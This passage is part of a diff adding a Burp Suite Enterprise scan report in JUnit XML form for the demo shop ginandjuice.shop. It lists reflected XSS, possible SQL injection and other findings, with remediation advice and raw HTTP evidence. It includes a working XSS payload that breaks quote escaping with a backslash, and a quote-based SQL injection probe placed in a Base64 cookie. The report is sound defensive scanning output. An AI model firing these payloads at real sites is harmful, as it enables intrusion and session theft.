+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=4" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=6" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=3" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=1" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=5" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/blog/post?postId=2" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="7" name="https://ginandjuice.shop:443/catalog?searchTerm=" tests="7">
+        <testcase name="Base64-encoded data in parameter">
+            <failure message="Base64-encoded data in parameter found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+The following parameter appears to contain Base64-encoded data:
+- TrackingId = {"type":"class","value":"c3c6Mgh5L89IhAFJ"}
+This issue was found in multiple locations under the reported path.
+
+Issue Background
+Applications sometimes Base64-encode parameters in an attempt to obfuscate them from users or facilitate transport of binary data. The presence of Base64-encoded data may indicate security-sensitive information or functionality that is worthy of further investigation. The data should be reviewed to determine whether it contains any interesting information, or provides any additional entry points for malicious input.
+
+
+Evidence
+Request 1:
+GET /catalog?searchTerm= HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=mZ6V7ezfxw43ZOV58e3Hi2w3jACOMUCB; AWSALB=5/6v6jypVaHlo0cSYHSlC3xzvMLuc3fv2a1XPumlRkt/m6qMsNIBiHglluLsklFyPQ1kBNJGnWRRdgiNXwFcdk3iPz8TtcuPCKt4sbs0jDTXrfwNMmVCm3NFO/vz; AWSALBCORS=5/6v6jypVaHlo0cSYHSlC3xzvMLuc3fv2a1XPumlRkt/m6qMsNIBiHglluLsklFyPQ1kBNJGnWRRdgiNXwFcdk3iPz8TtcuPCKt4sbs0jDTXrfwNMmVCm3NFO/vz; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImMzYzZNZ2g1TDg5SWhBRkoifQ==
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:14 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 16934
+Set-Cookie: AWSALB=/M9/7yseYEMGcDFMZBKkJQXkTQIKzQ4kktjvx2MYG7b32+wT4KX+S8VSpErDf91R2+beWZYEN7q9Lvmf6jiPKGsR+/RYEJPSC9YJSEETE0P5LBNwYu5kSPMHtLf0; Expires=Thu, 14 Sep 2023 10:58:14 GMT; Path=/
+Set-Cookie: AWSALBCORS=/M9/7yseYEMGcDFMZBKkJQXkTQIKzQ4kktjvx2MYG7b32+wT4KX+S8VSpErDf91R2+beWZYEN7q9Lvmf6jiPKGsR+/RYEJPSC9YJSEETE0P5LBNwYu5kSPMHtLf0; Expires=Thu, 14 Sep 2023 10:58:14 GMT; Path=/; SameSite=None; Secure
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip
+
+Request 2:
+POST /catalog/cart HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog/product?productId=4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Cookie: session=zF1kNYFuKGBDjElUA1z8raKrhbipRnOo; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImNrUmxROXdNNTFYYldWbG0ifQ==; AWSALB=2xK1CIgrMbs1veJkewJAglzwlF1XX9sUK6qD+9ODAjD2H7ulskvyxP4a41CYbq8q+sHa14P+qX8oUCMQurAVTmtz+ZQN57tL4yumoFZr8Pso/Q66cz/nwHDdPuKN; AWSALBCORS=2xK1CIgrMbs1veJkewJAglzwlF1XX9sUK6qD+9ODAjD2H7ulskvyxP4a41CYbq8q+sHa14P+qX8oUCMQurAVTmtz+ZQN57tL4yumoFZr8Pso/Q66cz/nwHDdPuKN
+
+productId=4&redir=PRODUCT&quantity=1
+
+Response 2:
+HTTP/2 302 Found
+Date: Thu, 07 Sep 2023 10:58:33 GMT
+Content-Length: 0
+Set-Cookie: AWSALB=lYaKXaV1Ru80Mw8QkEvX16j2WLLR+2Jp+47noZfJXnyTyEU2wc4yIal/aEWz+s0eJGabSDUvKRnywHG6ZaDclr94M5GMl2eSAt+NsyZkLGU2AgezlMvGsGkwLfSp; Expires=Thu, 14 Sep 2023 10:58:33 GMT; Path=/
+Set-Cookie: AWSALBCORS=lYaKXaV1Ru80Mw8QkEvX16j2WLLR+2Jp+47noZfJXnyTyEU2wc4yIal/aEWz+s0eJGabSDUvKRnywHG6ZaDclr94M5GMl2eSAt+NsyZkLGU2AgezlMvGsGkwLfSp; Expires=Thu, 14 Sep 2023 10:58:33 GMT; Path=/; SameSite=None; Secure
+Location: /catalog/product?productId=4
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+
+
+Request 3:
+GET /catalog/product?productId=9 HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=rwt1kANh9mm4IXbLDiBJJEcFqJTvE6X4; AWSALB=YqDKenHa74A2rZ/9HZ+PkgYX1nvPmflywyXPjxjdFov/lLCovUlFEqgGfL6yiYnF9d6dhV5VmDiuC8GPXgTq1uYJtoYky+2xXW0Ai3FPriZ9km1GlnRcJAMGs3VE; AWSALBCORS=YqDKenHa74A2rZ/9HZ+PkgYX1nvPmflywyXPjxjdFov/lLCovUlFEqgGfL6yiYnF9d6dhV5VmDiuC8GPXgTq1uYJtoYky+2xXW0Ai3FPriZ9km1GlnRcJAMGs3VE; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6ImhrRFZjU3F2TEtJdUFseHkifQ==
+
+
+
+Response 3:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:06 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 12272
+Set-Cookie: AWSALB=cbqCPqPxSt0JOprtnl0PA0wTBqHF8c7AlKwYQ9b5YCEnHTorkQc3Ec4OxPwVz3yRpXPGu6udFdh6mdhEVu+Ft6R1WxVW3WnF4ufgJYu0QvoGTzNSpDri7cAA2zqr; Expires=Thu, 14 Sep 2023 10:58:06 GMT; Path=/
+Set-Cookie: AWSALBCORS=cbqCPqPxSt0JOprtnl0PA0wTBqHF8c7AlKwYQ9b5YCEnHTorkQc3Ec4OxPwVz3yRpXPGu6udFdh6mdhEVu+Ft6R1WxVW3WnF4ufgJYu0QvoGTzNSpDri7cAA2zqr; Expires=Thu, 14 Sep 2023 10:58:06 GMT; Path=/; SameSite=None; Secure
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+
+
+Vulnerability Classifications
+
+- CWE-310: Cryptographic Issues (https://cwe.mitre.org/data/definitions/310.html)
+
+- CWE-311: Missing Encryption of Sensitive Data (https://cwe.mitre.org/data/definitions/311.html)
+
+- CAPEC-37: Retrieve Embedded Sensitive Data (https://capec.mitre.org/data/definitions/37.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Input returned in response (reflected)">
+            <failure message="Input returned in response (reflected) found at https://ginandjuice.shop/catalog" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The value of the searchTerm request parameter is copied into the application's response.
+
+Issue Background
+Reflection of input arises when data is copied from a request and echoed into the application's immediate response.
+Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. 
+
+
+Evidence
+Request:
+GET /catalog?searchTerm=iy959sjegg HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=VGdd5nEM6cxoSxjl7pJLFMM2R2JWJv8h; AWSALB=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; AWSALBCORS=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IkRhZDNwM2lKWHNTTDJUWEUifQ==
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:00:04 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9367
+Set-Cookie: AWSALB=7CbrBusZhsajVbPXxcxGmP/rcYQwjIft0sLhBfD9fl+WdeenweR75WY2cGThtbQWmhBRP2Kfp9D5EoHaJw82Ht9tMDK/660AO3PhALMhtEZoVKG4CoQObKm3yVni; Expires=Thu, 14 Sep 2023 11:00:04 GMT; Path=/
+Set-Cookie: AWSALBCORS=7CbrBusZhsajVbPXxcxGmP/rcYQwjIft0sLhBfD9fl+WdeenweR75WY2cGThtbQWmhBRP2Kfp9D5EoHaJw82Ht9tMDK/660AO3PhALMhtEZoVKG4CoQObKm3yVni; Expires=Thu, 14 Sep 2023 11:00:04 GMT; Path=/; SameSite=None; Secure
+X-Backend: ecfca00b-5a9e-4a89-91bd-de41ecbc4611
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip<script>
+var searchText = 'iy959sjegg';
+document.getElementById('searchBar').value = searchText;
+</script>Snip<script type="text/javascript" >
+const element = React.createElement;
+const categories = {"All":"/catalog","Accessories":"/catalog?category=Accessories&searchTerm=iy959sjegg","Accompaniments":"/catalog?category=Accompaniments&searchTerm=iy959sjegg","Books":"/catalog?category=Books&searchTerm=iy959sjegg","Gin":"/catalog?category=Gin&searchTerm=iy959sjegg","Juice":"/catalog?category=Juice&searchTerm=iy959sjegg"};
+const selectedCategory = null;
+const root = ReactDOM.createRoot(document.getElementById('react-container'));
+
+const categorySelected = (name, selected) =>Snip
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cross-site scripting (reflected)">
+            <failure message="Cross-site scripting (reflected) found at https://ginandjuice.shop/catalog" type="High"><![CDATA[
+Severity: High
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The value of the searchTerm request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload 14925\';alert(1)//549 was submitted in the searchTerm parameter. This input was echoed as 14925\\';alert(1)//549 in the application's response.
+
+This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.
+
+The application attempts to prevent termination of the quoted JavaScript string by placing a backslash character (\) before any quotation mark characters contained within the input. The purpose of this defense is to escape the quotation mark and prevent it from terminating the string. However, the application fails to escape any backslash characters that already appear within the input itself. This enables an attacker to supply their own backslash character before the quotation mark, which has the effect of escaping the backslash character added by the application, and so the quotation mark remains unescaped and succeeds in terminating the string. This technique is used in the attack demonstrated.
+
+Issue Background
+Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.
+
+The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.
+
+Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).
+
+The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. 
+
+
+Remediation Detail
+Echoing user-controllable data within a script context is inherently dangerous and can make XSS attacks difficult to prevent. If at all possible, the application should avoid echoing user data within this context. If it is unavoidable to echo user input into a quoted JavaScript string then the backslash character should be blocked, or escaped by replacing it with two backslashes.
+
+Remediation Background
+In most situations where user-controllable data is copied into application responses, cross-site scripting
+attacks can be prevented using two layers of defenses:
+
+
+
+- Input should be validated as strictly as possible on arrival, given the kind of content that
+it is expected to contain. For example, personal names should consist of alphabetical
+and a small range of typographical characters, and be relatively short; a year of birth
+should consist of exactly four numerals; email addresses should match a well-defined
+regular expression. Input which fails the validation should be rejected, not sanitized.
+
+- User input should be HTML-encoded at any point where it is copied into
+application responses. All HTML metacharacters, including < > " ' and =, should be
+replaced with the corresponding HTML entities (&lt; &gt; etc).
+
+In cases where the application's functionality allows users to author content using
+a restricted subset of HTML tags and attributes (for example, blog comments which
+allow limited formatting and linking), it is necessary to parse the supplied HTML to
+validate that it does not use any dangerous syntax; this is a non-trivial task.
+
+
+Evidence
+Request:
+GET /catalog?searchTerm=14925%5c'%3balert(1)%2f%2f549 HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=VGdd5nEM6cxoSxjl7pJLFMM2R2JWJv8h; AWSALB=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; AWSALBCORS=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IkRhZDNwM2lKWHNTTDJUWEUifQ==
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:00:14 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9504
+Set-Cookie: AWSALB=+ppnX0vFNlm/2qWiLRccs+Zkrbr5XmbCRW0IO/xMQq8leVIAR8f2BNyDVdI4g6af67kBlu5jZIIe00ABZleDr7Ln+pfJnqmqgKKgX4HPdETqqfnkWazp10zqwUp6; Expires=Thu, 14 Sep 2023 11:00:14 GMT; Path=/
+Set-Cookie: AWSALBCORS=+ppnX0vFNlm/2qWiLRccs+Zkrbr5XmbCRW0IO/xMQq8leVIAR8f2BNyDVdI4g6af67kBlu5jZIIe00ABZleDr7Ln+pfJnqmqgKKgX4HPdETqqfnkWazp10zqwUp6; Expires=Thu, 14 Sep 2023 11:00:14 GMT; Path=/; SameSite=None; Secure
+X-Backend: ecfca00b-5a9e-4a89-91bd-de41ecbc4611
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip<script>
+var searchText = '14925\\';alert(1)//549';
+document.getElementById('searchBar').value = searchText;
+</script>Snip
+
+
+
+References
+	
+- Web Security Academy: Cross-site scripting (https://portswigger.net/web-security/cross-site-scripting)
+
+- Web Security Academy: Reflected cross-site scripting (https://portswigger.net/web-security/cross-site-scripting/reflected)
+
+- Using Burp to Find XSS issues (https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html)
+
+
+
+Vulnerability Classifications
+
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (https://cwe.mitre.org/data/definitions/79.html)
+
+- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) (https://cwe.mitre.org/data/definitions/80.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+- CWE-159: Failure to Sanitize Special Element (https://cwe.mitre.org/data/definitions/159.html)
+
+- CAPEC-591: Reflected XSS (https://capec.mitre.org/data/definitions/591.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="SQL injection">
+            <failure message="SQL injection found at https://ginandjuice.shop/catalog" type="High"><![CDATA[
+Severity: High
+
+Confidence: Tentative
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The value JSON parameter, within the Base64-decoded value of the TrackingId cookie appears to be vulnerable to SQL injection attacks. A single quote was submitted in the value JSON parameter, within the Base64-decoded value of the TrackingId cookie, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
+
+Issue Background
+SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.
+
+A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. 
+
+
+Issue Remediation
+The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.
+
+You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: 
+
+
+
+- One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.
+
+- Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.
+
+
+
+Evidence
+Request 1:
+GET /catalog?searchTerm= HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=VGdd5nEM6cxoSxjl7pJLFMM2R2JWJv8h; AWSALB=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; AWSALBCORS=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IkRhZDNwM2lKWHNTTDJUWEUnIn0%3d
+
+
+
+Response 1:
+HTTP/2 500 Internal Server Error
+Date: Thu, 07 Sep 2023 11:01:50 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 3719
+Set-Cookie: AWSALB=f2PuSkO/lQU7X83oTgA64s6WhR4s3DxAuO29bkXBIV+k8x87ZSNL5DllWj4Wg7GX4Bspax9YV1ObV6wCGVlXd4EXnE/egiVuBxRAeTVIVPbeEKoca72iTdZdCUUE; Expires=Thu, 14 Sep 2023 11:01:50 GMT; Path=/
+Set-Cookie: AWSALBCORS=f2PuSkO/lQU7X83oTgA64s6WhR4s3DxAuO29bkXBIV+k8x87ZSNL5DllWj4Wg7GX4Bspax9YV1ObV6wCGVlXd4EXnE/egiVuBxRAeTVIVPbeEKoca72iTdZdCUUE; Expires=Thu, 14 Sep 2023 11:01:50 GMT; Path=/; SameSite=None; Secure
+X-Backend: ecfca00b-5a9e-4a89-91bd-de41ecbc4611
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labs.css rel=stylesheet>
+<link href=/resources/Snip
+
+Request 2:
+GET /catalog?searchTerm= HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
+Cookie: session=VGdd5nEM6cxoSxjl7pJLFMM2R2JWJv8h; AWSALB=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; AWSALBCORS=z8yZB5DIgyVddGtK3eNvNUVJQQNKnc9xG5rH0b2Zph9WXB3PP96X40LdWtADgCfB10QKSsOn+jk7Q+3br8VTbzONFGPfrnftLe5jH2UllAZs/MFwSZ1tmpevUIUe; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IkRhZDNwM2lKWHNTTDJUWEUnJyJ9
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 11:01:50 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 16934
+Set-Cookie: AWSALB=4XuK9yTEu4YClcUxuNOYGBycjqmDGHktDQ6rvEtr5+Zir2ZfQbrb25CKESp1+sDrWo4HsZM7Kzf2f2YMpDSPdU+CnwSLWKNr5Hszb8H1GkpcyYfiKggQ8roeDY6x; Expires=Thu, 14 Sep 2023 11:01:50 GMT; Path=/
+Set-Cookie: AWSALBCORS=4XuK9yTEu4YClcUxuNOYGBycjqmDGHktDQ6rvEtr5+Zir2ZfQbrb25CKESp1+sDrWo4HsZM7Kzf2f2YMpDSPdU+CnwSLWKNr5Hszb8H1GkpcyYfiKggQ8roeDY6x; Expires=Thu, 14 Sep 2023 11:01:50 GMT; Path=/; SameSite=None; Secure
+X-Backend: ecfca00b-5a9e-4a89-91bd-de41ecbc4611
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsEcommerce.css rel=stylesheet>
+<link href=/rSnip
+
+
+
+References
+
+- Web Security Academy: SQL injection (https://portswigger.net/web-security/sql-injection)
+
+- Using Burp to Test for Injection Flaws (https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws)
+
+- Web Security Academy: SQL Injection Cheat Sheet (https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+
+
+Vulnerability Classifications
+
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') (https://cwe.mitre.org/data/definitions/89.html)
+
+- CWE-94: Improper Control of Generation of Code ('Code Injection') (https://cwe.mitre.org/data/definitions/94.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+- CAPEC-66: SQL Injection (https://capec.mitre.org/data/definitions/66.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="DOM data manipulation (reflected DOM-based)">
+            <failure message="DOM data manipulation (reflected DOM-based) found at https://ginandjuice.shop/catalog" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /catalog
+
+
+Issue Detail
+The application may be vulnerable to reflected DOM-based DOM data manipulation.
+
+The value of the searchTerm request parameter is copied into a JavaScript string literal. The payload g6znb8eawh was submitted in the searchTerm parameter.
+
+The string containing the payload is then passed to the 'value' property of a DOM element.
+
+Issue Background
+Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.
+
+DOM data manipulation arises when a script writes controllable data to a field within the DOM that is used within the visible UI or client-side application logic. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will modify the appearance or behavior of the client-side UI. An attacker may be able to leverage this to perform virtual defacement of the application, or possibly to induce the user to perform unintended actions. 
+
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based DOM data manipulation vulnerabilities is not to dynamically write to DOM data fields any data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from being stored. In general, this is best achieved by using a whitelist of permitted values.
+
+
+Evidence
+Request 1:
+GET /catalog?searchTerm=g6znb8eawh HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/catalog
